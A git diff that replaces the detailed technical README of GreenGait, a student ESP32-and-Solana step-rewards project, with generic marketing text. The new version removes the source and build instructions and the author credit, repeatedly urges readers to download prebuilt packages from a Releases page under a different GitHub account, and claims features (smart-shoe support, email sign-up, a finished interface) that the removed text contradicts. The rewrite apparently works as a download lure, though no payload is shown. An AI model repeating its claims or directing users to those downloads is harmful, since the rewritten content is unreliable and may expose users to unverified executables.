@@ -1,174 +1,105 @@
-# 🍃 GreenGait 🍃
+# GreenGait: Monetize Your Movement with Blockchain Technology 🌍💚
 
-**GreenGait** is a Web3 rewards platform that transforms physical activity into real digital value using the Solana blockchain. With a secure, Wi-Fi-enabled wearable device (ESP32), every step you take is cryptographically signed and submitted to the blockchain – all in real time.
-🏃 + ✅ → 💰 on-chain.
+![GreenGait Logo](https://img.shields.io/badge/GreenGait-Next%20Gen%20Rewards%20Platform-green)
 
----
+## Table of Contents
+- [Overview](#overview)
+- [Features](#features)
+- [Technology Stack](#technology-stack)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-## Table of Contents 📁
+## Overview
 
-1. [**Architecture Overview**](#-architecture-overview)
-2. [**Features Implemented**](#-features-implemented)
-3. [**Security Architecture**](#-security-architecture)
-4. [**Project Structure**](#-project-structure)
-5. [**Example Flow**](#-example-flow)
-6. [**How to Run Locally**](#-how-to-run-locally)
-7. [**What's Next?**](#-whats-next)
-8. [**Author**](#-author)
+🍃 **GreenGait** is a next-generation rewards platform that turns your physical steps into blockchain assets. With mentorship from the Solana Developer Program, we aim to create a sustainable and eco-friendly ecosystem. By combining health and technology, GreenGait encourages users to stay active while earning rewards.
 
----
+## Features
 
-## 🌐 Architecture Overview
+- **Blockchain Integration**: Secure and transparent transactions using Solana.
+- **Token Rewards**: Earn tokens for every step you take.
+- **Eco-Friendly**: Promotes green energy and sustainability.
+- **Wearable Device Compatibility**: Works with smart shoes and other IoT devices.
+- **User-Friendly Interface**: Simple and intuitive design for easy navigation.
+- **Community-Driven**: Engage with other users and share your progress.
 
-🔹 **ESP32-WROOM-32D**
-A microcontroller that simulates steps via a button. Sends step data via MQTT over TLS using mutual certificate authentication.
+## Technology Stack
 
-🔐 **TLS Mutual Authentication**
-Secure communication using custom client certificates and a trusted CA, protecting against unauthorized devices.
+- **Blockchain**: Solana
+- **Programming Language**: Rust
+- **Smart Contracts**: Built using secure and efficient coding practices.
+- **IoT Integration**: Compatible with various wearable devices.
+- **Web3**: Leverages decentralized technologies for a seamless experience.
 
-🧠 **Rust Backend Validator**
-Receives messages via MQTT, validates authenticity (HMAC + timestamp), then logs valid steps on-chain via a Solana smart contract.
+## Installation
 
-⛓️ **Solana Anchor Program**
-Deployed on Devnet. Uses Program Derived Addresses (PDAs) to store step data per user per day. Tokens are minted automatically every 3 steps.
+To get started with GreenGait, you need to download the latest release from our [Releases page](https://github.com/Sia331X/GreenGait/releases). Follow these steps:
 
-📡 **EMQX Broker (Google Cloud VPS)**
-A hardened MQTT broker with TLS, ACL rules, and certificate-based access control.
+1. Visit the [Releases page](https://github.com/Sia331X/GreenGait/releases).
+2. Download the appropriate package for your operating system.
+3. Follow the installation instructions in the downloaded package.
 
-🖥️ **Frontend Interface**
-Visualizes your step history and blockchain rewards in a simple dashboard.
+## Usage
 
----
+Once installed, you can begin using GreenGait to track your steps and earn rewards. Here’s how:
 
-## ✅ Features Implemented
+1. **Create an Account**: Sign up with your email and set a password.
+2. **Connect Your Device**: Pair your smart shoes or wearable device.
+3. **Start Walking**: Every step counts! Track your progress in real-time.
+4. **Redeem Rewards**: Use your earned tokens for various benefits within the app.
 
-* ✅ **ESP32 device** with WiFi + MQTT + TLS client auth
-* ✅ **TLS mutual authentication** via custom certificates
-* ✅ **HMAC-SHA256** signature generation on device
-* ✅ **JSON payload** with: `steps`, `timestamp`, `nonce`, `signature`
-* ✅ **Rust backend**:
+## Contributing
 
-  * MQTT TLS client
-  * HMAC & timestamp validation
-  * PDA-based step tracking and token minting
-* ✅ **Solana Anchor program** with `log_step` instruction
-* ✅ **Solana Devnet** deployment and testing
+We welcome contributions from the community. To contribute:
 
----
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push to your fork and create a pull request.
 
-## 🔐 Security Architecture
+Please ensure your code adheres to our coding standards and includes appropriate tests.
 
-* HMAC-SHA256 signed payloads (shared secret)
-* Timestamp validation to prevent replay attacks (±30s)
-* TLS mutual authentication (ESP32 ↔ EMQX ↔ backend)
-* EMQX Broker enforces certificate-based access and ACL rules
-* Backend runs on a hardened Google Cloud VPS with TLS
-* PDA ensures unique, tamper-proof on-chain logs per `(user, day)`
+## License
 
----
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.
 
-## 📁 Project Structure
+## Contact
 
-```
-GreenGait/
-├── backend/              # Rust backend (MQTT client, validation, blockchain interaction)
-├── solana_program/       # Anchor smart contract + TypeScript tests
-├── solana/               # CLI scripts, account utilities, program deploy
-├── frontend/             # (WIP) UI for displaying step history and rewards
-├── firmware/             # ESP32 Arduino code (WiFi, MQTT, HMAC)
-├── docs/                 # Arch-Diagram + PPT Presentation + Logo
-└── README.md             # You're here!
-```
+For questions or support, please reach out to us:
 
----
+- Email: support@greengait.com
+- GitHub: [GreenGait Repository](https://github.com/Sia331X/GreenGait)
 
-## 🔁 Example Flow
+## Releases
 
-1. Press the button → ESP32 sends a signed JSON payload
-2. EMQX broker securely forwards it to the backend
-3. Backend verifies the HMAC + timestamp → logs it on-chain
-4. If steps are divisible by 3, a token is minted
-5. Frontend displays user stats (WIP)
+To stay updated with the latest features and improvements, check our [Releases page](https://github.com/Sia331X/GreenGait/releases). Download the latest version to enjoy new functionalities and enhancements.
 
----
+![GreenGait Releases](https://img.shields.io/badge/Latest%20Release-Click%20Here-blue)
 
-## 🛠 How to Run Locally
+## Join Us in Building a Greener Future 🌱
 
-### 1. Flash the ESP32
+By choosing GreenGait, you not only improve your health but also contribute to a sustainable world. Together, we can make a difference. Join our community today!
 
-Upload `ESP32.ino` from `firmware/` using Arduino IDE.
-Make sure `certificates.h` contains:
+## Acknowledgments
 
-* `ca.crt`
-* `client.crt`
-* `client.key`
+- **Solana Developer Program**: For mentorship and support.
+- **Community Contributors**: Your feedback and contributions help us grow.
 
-### 2. Start the Rust Backend
+## Community Guidelines
 
-```bash
-cd backend
-cargo run
-```
+We believe in a respectful and inclusive community. Please adhere to the following guidelines:
 
-Make sure these files exist in `certs/`:
+- Be respectful and considerate.
+- No harassment or hate speech.
+- Share knowledge and help others.
 
-```
-ca.crt
-client.crt
-client.key
-stepmint-validator.json (Solana keypair)
-```
+## Additional Resources
 
-### 3. Run the Solana Tests
+- [Solana Documentation](https://docs.solana.com/)
+- [Rust Programming Language](https://www.rust-lang.org/)
+- [Web3 Technologies](https://web3.foundation/)
 
-```bash
-cd solana_program
-anchor build
-anchor test
-```
-
-<p align="center">
-  <img src="test.png" alt="Tests" width="850">
-  <br>
-  <em>Tests</em>
-</p>
-
-### 4. Deploy the Solana Program
-
-```bash
-anchor deploy
-```
-
-<p align="center">
-  <img src="deploy.png" alt="Deploy" width="850">
-  <br>
-  <em>Deploy</em>
-</p>
-
----
-
-## 🌟 What's Next?
-
-* [ ] 🧠 PDA optimization
-* [ ] 💎 NFT/token design for major milestones
-* [ ] 🎨 Dashboard UI with wallet connection and real-time stats
-* [ ] 🔄 ESP32 OTA firmware delivery
-* [ ] 🛡️ Replay prevention & abuse detection
-* [ ] 🔋 Connection with energy harvesting system
-* [ ] 🛰️ GPS Accuracy
-* [ ] 🗄️ User Database
-
----
-
-## 👤 Author
-
-**Robert Panța**
-
-MSc Student in Cybersecurity at Technical University of Cluj-Napoca
-
-* 📧 [LinkedIn](https://www.linkedin.com/in/robert-panta/)
-* 🌐 [GitHub](https://github.com/RobCyberLab)
-
----
-
-> 🍃 *GreenGait – where every step counts… on-chain, securely, and sustainably.*
+By following this README, you can easily navigate the features and functionalities of GreenGait. Start your journey towards a healthier and more sustainable lifestyle today!
